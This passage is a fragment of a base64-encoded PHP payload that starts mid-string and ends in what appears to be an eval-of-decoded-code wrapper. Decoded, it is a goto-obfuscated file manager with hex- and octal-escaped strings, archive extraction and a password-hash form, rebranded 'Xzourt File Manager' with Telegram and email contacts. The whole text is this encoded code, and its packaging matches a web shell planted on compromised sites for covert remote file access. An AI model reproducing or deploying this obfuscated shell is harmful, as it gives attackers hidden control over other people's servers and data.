iBfX2NvbnN0cnVjdCgpIHsgJHRoaXMtPnRhciA9IG51bGw7IH0gcHVibGljIGZ1bmN0aW9uIGNyZWF0ZSgkZmlsZW5hbWUsICRmaWxlcykgeyAkdGhpcy0+dGFyID0gbmV3IFBoYXJEYXRhKCRmaWxlbmFtZSk7IGlmIChpc19hcnJheSgkZmlsZXMpKSB7IGZvcmVhY2ggKCRmaWxlcyBhcyAkZikgeyBpZiAoISR0aGlzLT5hZGRGaWxlT3JEaXIoJGYpKSB7IHJldHVybiBmYWxzZTsgfSB9IHJldHVybiB0cnVlOyB9IGVsc2UgeyBpZiAoJHRoaXMtPmFkZEZpbGVPckRpcigkZmlsZXMpKSB7IHJldHVybiB0cnVlOyB9IHJldHVybiBmYWxzZTsgfSB9IHB1YmxpYyBmdW5jdGlvbiB1bnppcCgkZmlsZW5hbWUsICRwYXRoKSB7ICRyZXMgPSAkdGhpcy0+dGFyLT5vcGVuKCRmaWxlbmFtZSk7IGlmICgkcmVzICE9PSB0cnVlKSB7IHJldHVybiBmYWxzZTsgfSBpZiAoJHRoaXMtPnRhci0+ZXh0cmFjdFRvKCRwYXRoKSkgeyByZXR1cm4gdHJ1ZTsgfSByZXR1cm4gZmFsc2U7IH0gcHJpdmF0ZSBmdW5jdGlvbiBhZGRGaWxlT3JEaXIoJGZpbGVuYW1lKSB7IGlmIChpc19maWxlKCRmaWxlbmFtZSkpIHsgdHJ5IHsgJHRoaXMtPnRhci0+YWRkRmlsZSgkZmlsZW5hbWUpOyByZXR1cm4gdHJ1ZTsgfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7IHJldHVybiBmYWxzZTsgfSB9IGVsc2VpZiAoaXNfZGlyKCRmaWxlbmFtZSkpIHsgcmV0dXJuICR0aGlzLT5hZGREaXIoJGZpbGVuYW1lKTsgfSByZXR1cm4gZmFsc2U7IH0gcHJpdmF0ZSBmdW5jdGlvbiBhZGREaXIoJHBhdGgpIHsgJG9iamVjdHMgPSBzY2FuZGlyKCRwYXRoKTsgaWYgKGlzX2FycmF5KCRvYmplY3RzKSkgeyBmb3JlYWNoICgkb2JqZWN0cyBhcyAkZmlsZSkgeyBpZiAoJGZpbGUgIT0gIlw1NiIgJiYgJGZpbGUgIT0gIlw1Nlw1NiIpIHsgaWYgKGlzX2RpcigkcGF0aCAuICJcNTciIC4gJGZpbGUpKSB7IGlmICghJHRoaXMtPmFkZERpcigkcGF0aCAuICJcNTciIC4gJGZpbGUpKSB7IHJldHVybiBmYWxzZTsgfSB9IGVsc2VpZiAoaXNfZmlsZSgkcGF0aCAuICJceDJmIiAuICRmaWxlKSkgeyB0cnkgeyAkdGhpcy0+dGFyLT5hZGRGaWxlKCRwYXRoIC4gIlx4MmYiIC4gJGZpbGUpOyB9IGNhdGNoIChFeGNlcHRpb24gJGUpIHsgcmV0dXJuIGZhbHNlOyB9IH0gfSB9IHJldHVybiB0cnVlOyB9IHJldHVybiBmYWxzZTsgfSB9IGdvdG8gb2ZZZU47IHUyeElkOiBpZiAoaXNzZXQoJF9HRVRbIlwxNTBcMTQ1XHg2Y1wxNjAiXSkpIHsgZm1fc2hvd19oZWFkZXIoKTsgZm1fc2hvd19uYXZfcGF0aChGTV9QQVRIKTsgZ2xvYmFsICRjZmcsICRsYW5nOyA/PgoKICAgIDxkaXYgY2xhc3M9ImNvbC1tZC04IG9mZnNldC1tZC0yIHB0LTMiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgbWItMiA8P3BocCAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4KIj4KICAgICAgICAgICAgPGg2IGNsYXNzPSJjYXJkLWhlYWRlciI+CiAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtZXhjbGFtYXRpb24tY2lyY2xlIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXHg0OFwxNDVceDZjXDE2MCIpOyA/PgogICAgICAgICAgICAgICAgPGEgaHJlZj0iP3A9PD9waHAgIGVjaG8gRk1fUEFUSDsgPz4KIiBjbGFzcz0iZmxvYXQtcmlnaHQiPjxpIGNsYXNzPSJmYSBmYS13aW5kb3ctY2xvc2UiPjwvaT4gPD9waHAgIGVjaG8gbG5nKCJceDQzXDE0MVx4NmVcMTQzXHg2NVwxNTQiKTsgPz4KPC9hPgogICAgICAgICAgICA8L2g2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29sLXNtLTYiPgogICAgICAgICAgICAgICAgICAgICAgICA8cD48aDM+PGEgaHJlZj0iaHR0cHM6Ly90Lm1lL3h6b3VydCIgdGFyZ2V0PSJfYmxhbmsiIGNsYXNzPSJhcHAtdi10aXRsZSI+IFh6b3VydCBGaWxlIE1hbmFnZXIgPD9waHAgIGVjaG8gVkVSU0lPTjsgPz4KPC9hPjwvaDM+PC9wPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5BdXRob3I6IFh6b3VydDwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+TWFpbCBVczogPGEgaHJlZj0ibWFpbHRvOnguczRhQHlhbmRleC5jb20iPnguczRhW2F0XXlhbmRleC5jb208L2E+IDwvcD4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29sLXNtLTYiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibGlzdC1ncm91cCBsaXN0LWdyb3VwLWZsdXNoIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtZ3JvdXAtaXRlbSI+PGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL3ByYXNhdGhtYW5pL3RpbnlmaWxlbWFuYWdlci93aWtpIiB0YXJnZXQ9Il9ibGFuayI+PGkgY2xhc3M9ImZhIGZhLXF1ZXN0aW9uLWNpcmNsZSI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlwxMTBceDY1XHg2Y1wxNjBceDIwXDEwNFx4NmZceDYzXHg3NVwxNTVcMTQ1XDE1Nlx4NzRceDczIik7ID8+CiA8L2E+IDwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWdyb3VwLWl0ZW0iPjxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9wcmFzYXRobWFuaS90aW55ZmlsZW1hbmFnZXIvaXNzdWVzIiB0YXJnZXQ9Il9ibGFuayI+PGkgY2xhc3M9ImZhIGZhLWJ1ZyI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlx4NTJcMTQ1XDE2MFx4NmZcMTYyXDE2NFx4MjBceDQ5XDE2M1wxNjNcMTY1XHg2NSIpOyA/Pgo8L2E+PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtZ3JvdXAtaXRlbSI+PGEgaHJlZj0iamF2YXNjcmlwdDpsYXRlc3RfcmVsZWFzZV9pbmZvKCc8P3BocCAgZWNobyBWRVJTSU9OOyA/PgonKTsiPjxpIGNsYXNzPSJmYSBmYS1saW5rIj4gPC9pPiA8P3BocCAgZWNobyBsbmcoIlx4NDNcMTUwXDE0NVx4NjNcMTUzXDQwXDExNFx4NjFcMTY0XDE0NVwxNjNcMTY0XHgyMFx4NTZceDY1XDE2MlwxNjNceDY5XDE1N1wxNTYiKTsgPz4KPC9hPjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgIGlmICghRk1fUkVBRE9OTFkpIHsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtZ3JvdXAtaXRlbSI+PGEgaHJlZj0iamF2YXNjcmlwdDpzaG93X25ld19wd2QoKTsiPjxpIGNsYXNzPSJmYSBmYS1sb2NrIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXDEwN1x4NjVceDZlXHg2NVwxNjJcMTQxXHg3NFx4NjVcNDBcMTU2XHg2NVx4NzdceDIwXHg3MFwxNDFcMTYzXHg3M1x4NzdcMTU3XDE2MlwxNDRceDIwXDE1MFx4NjFcMTYzXHg2OCIpOyA/Pgo8L2E+PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAgfSA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyBqcy1uZXctcHdkIGhpZGRlbiBtdC0yIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMTIiPgogICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBjbGFzcz0iZm9ybS1pbmxpbmUiIG9uc3VibWl0PSJyZXR1cm4gbmV3X3Bhc3N3b3JkX2hhc2godGhpcykiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idHlwZSIgdmFsdWU9InB3ZGhhc2giIGFyaWEtbGFiZWw9ImhpZGRlbiIgYXJpYS1oaWRkZW49InRydWUiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBtYi0yIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJzdGF0aWNFbWFpbDIiPjw/cGhwICBlY2hvIGxuZygiXHg0N1wxNDVcMTU2XHg2NVwxNjJceDYxXDE2NFx4NjVceDIwXDE1NlwxNDVceDc3XDQwXHg3MFx4NjFceDczXDE2M1wxNjdcMTU3XDE2MlwxNDRcNDBceDY4XHg2MVx4NzNcMTUwIik7ID8+CjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgbXgtc20tMyBtYi0yIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJpbnB1dFBhc3N3b3JkMiIgY2xhc3M9InNyLW9ubHkiPjw/cGhwICBlY2hvIGxuZygiXHg1MFwxNDFcMTYzXDE2M1wxNjdceDZmXDE2Mlx4NjQiKTsgPz4KPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCBidG4tc20iIGlkPSJpbnB1dFBhc3N3b3JkMiIgbmFtZT0iaW5wdXRQYXNzd29yZDIiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCIgcmVxdWlyZWQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIGJ0bi1zbSBtYi0yIj48P3BocCAgZWNobyBsbmcoIlwxMDdcMTQ1XHg2ZVx4NjVceDcyXHg2MVx4NzRcMTQ1Iik7ID8+CjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZXh0YXJlYSBjbGFzcz0iZm9ybS1jb250cm9sIiByb3dzPSIyIiByZWFkb25seSBpZD0ianMtcHdkLXJlc3VsdCI+PC90ZXh0YXJlYT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPD9waHAgIGZtX3Nob3dfZm9vdGVyKCk7IGRpZTsgfSBnb3RvIFd5NmdoOyBTUFNWMTogZnVuY3Rpb24gZm1faXNfdXRmOCgkc3RyaW5nKSB7IHJldHVybiBwcmVnX21hdGNoKCJcNTdceDJmXDE2NSIsICRzdHJpbmcpOyB9IGdvdG8gZGRaT287IHk3Y2dUOiAkcGFyZW50ID0gZm1fZ2V0X3BhcmVudF9wYXRoKEZNX1BBVEgpOyBnb3RvIHpKRVhBOyB0eXIwMjog')); ?>